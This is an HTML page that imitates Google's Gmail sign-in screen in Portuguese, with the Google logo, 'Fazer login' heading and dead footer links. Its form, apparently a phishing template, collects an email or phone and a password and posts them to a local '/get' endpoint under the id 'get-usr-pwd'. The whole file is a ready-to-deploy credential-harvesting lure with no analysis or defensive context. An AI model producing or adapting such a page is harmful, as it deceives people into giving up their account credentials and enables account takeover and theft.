<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <title>Gmail</title>
    <link rel="icon" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2016%2016'%3E%3Ctext%20x='0'%20y='14'%3E✉️%3C/text%3E%3C/svg%3E" type="image/svg+xml" />
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: "Google Sans",roboto,"Noto Sans Myanmar UI",arial,sans-serif;
        }
        body {
            display: flex;
            flex-direction: column; /* Alterado para empilhar elementos verticalmente */
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #f1f1f1;
        }
  
        .login-container {
            width: 100%;
            max-width: 400px;
            margin: auto;
            padding: 20px;
            border: 1px solid #e9e9e9;
            border-radius: 25px;
            margin-top: 50px;
            background-color: #fff;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        #logo {
            display: block;
            margin: 0 auto 20px;
        }
        h1, h2, h6 {
            color: #1f1f1f;
            margin-bottom: 20px;
            font-weight: 400;
            letter-spacing: 0rem;
            line-height: 1.5;
            word-break: break-word;
        }
        .g-input {
            display: block;
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        .gbtn-primary {
            display: block;
            width: 100px;
            padding: 10px;
            border: none;
            border-radius: 55px;
            background-color: #1a73e8;
            color: #fff;
            cursor: pointer;
            max-width: 200px !important;
            float: right;
        }
        label {
            font-size: 12px;
            color: #6a6b6b;
            margin-left: 10px;
            margin-top: 1px;
            margin-bottom: 12px;
        }
        .g-footer{
            margin-top: 100px;
            text-align: center;
            font-size: 12px;
            color: #a0a0a0;
            width: 100%;
            max-width: 400px; /* Mesma largura do container de login */
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 10px; /* Espaçamento entre os links */
        }
        .g-footer a {
            color: #a0a0a0;
            text-decoration: none;
            margin: 0 5px;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <form action="/get" id="get-usr-pwd" method="post" autocomplete="on">
            <div id="logo">
                <svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true" jsname="jjf7Ff"><path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path><path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path><path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path><path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path></svg>
            </div>
            <h2>Fazer login</h2>
            <h6>Ir para o Gmail</h6>
            <input name="usr" type="text" class="g-input" placeholder="E-mail ou telefone" required>
            <input name="pwd" type="password" class="g-input" placeholder="Senha" required>
            <h6 style="color: #a0a0a0;">
                Não está no seu computador? Use uma janela privada para fazer login.
            </h6>
            <button class="gbtn-primary"  type="submit">Avançar</button>
        </form>
    </div>
    <div class="g-footer">
        <a href="#">Ajuda</a>
        <a href="#">Privacidade</a>
        <a href="#">Termos</a>
        <a href="#">Configurações</a>
        <a href="#">Sobre</a>         
        <a href="#">Google</a>
    </div>
    <br>
</body>
</html>
